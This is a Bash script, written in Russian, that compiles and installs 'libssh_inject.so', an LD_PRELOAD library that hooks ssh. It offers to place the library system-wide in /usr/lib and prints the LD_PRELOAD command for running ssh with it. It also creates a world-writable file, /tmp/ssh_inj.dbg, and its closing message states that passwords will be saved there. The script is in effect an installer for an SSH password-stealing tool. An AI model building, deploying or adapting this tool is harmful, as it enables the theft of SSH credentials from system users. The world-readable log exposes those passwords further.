#!/bin/bash

# Скрипт для компиляции и установки libssh_inject.so

# Проверка root прав
if [ "$EUID" -ne 0 ]; then
  echo "Для установки библиотеки требуются права администратора."
  echo "Запустите скрипт с sudo: sudo ./compile.sh"
  exit 1
fi

# Создаем директорию для исходников, если она отсутствует
mkdir -p src/ssh_inject

# Копируем исходные файлы
cp state.hpp src/ssh_inject/
cp ssh_inject.cpp src/ssh_inject/

# Компилируем библиотеку
echo "Компиляция libssh_inject.so..."
g++ -shared -fPIC -o libssh_inject.so src/ssh_inject/ssh_inject.cpp -ldl

if [ $? -ne 0 ]; then
  echo "Ошибка компиляции! Проверьте наличие компилятора g++ и библиотеки libdl."
  exit 1
fi

# Проверяем, что скомпилировалось успешно
if [ ! -f libssh_inject.so ]; then
  echo "Ошибка: файл libssh_inject.so не найден после компиляции."
  exit 1
fi

echo "Библиотека успешно скомпилирована."

# Настраиваем права доступа
chmod 755 libssh_inject.so

# Создаем лог-файл, если его нет
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Предлагаем пользователю варианты установки
echo ""
echo "Как вы хотите установить библиотеку?"
echo "1. Скопировать в /usr/lib для системного использования"
echo "2. Оставить в текущей директории для локального использования"
echo "3. Не устанавливать, только скомпилировать"
read -p "Выберите вариант (1-3): " install_choice

case $install_choice in
  1)
    # Системная установка
    cp libssh_inject.so /usr/lib/
    echo "Библиотека установлена в /usr/lib/"
    echo ""
    echo "Для использования выполните команду:"
    echo "LD_PRELOAD=/usr/lib/libssh_inject.so ssh user@server"
    ;;
  2)
    # Локальная установка
    echo "Библиотека оставлена в текущей директории: $(pwd)/libssh_inject.so"
    echo ""
    echo "Для использования выполните команду:"
    echo "LD_PRELOAD=$(pwd)/libssh_inject.so ssh user@server"
    ;;
  3)
    # Только компиляция
    echo "Библиотека скомпилирована: $(pwd)/libssh_inject.so"
    echo ""
    echo "Для использования выполните команду:"
    echo "LD_PRELOAD=$(pwd)/libssh_inject.so ssh user@server"
    ;;
  *)
    echo "Неверный выбор. Библиотека оставлена в текущей директории."
    echo ""
    echo "Для использования выполните команду:"
    echo "LD_PRELOAD=$(pwd)/libssh_inject.so ssh user@server"
    ;;
esac

echo ""
echo "Пароли будут сохраняться в файл: /tmp/ssh_inj.dbg"
echo "Завершено!" 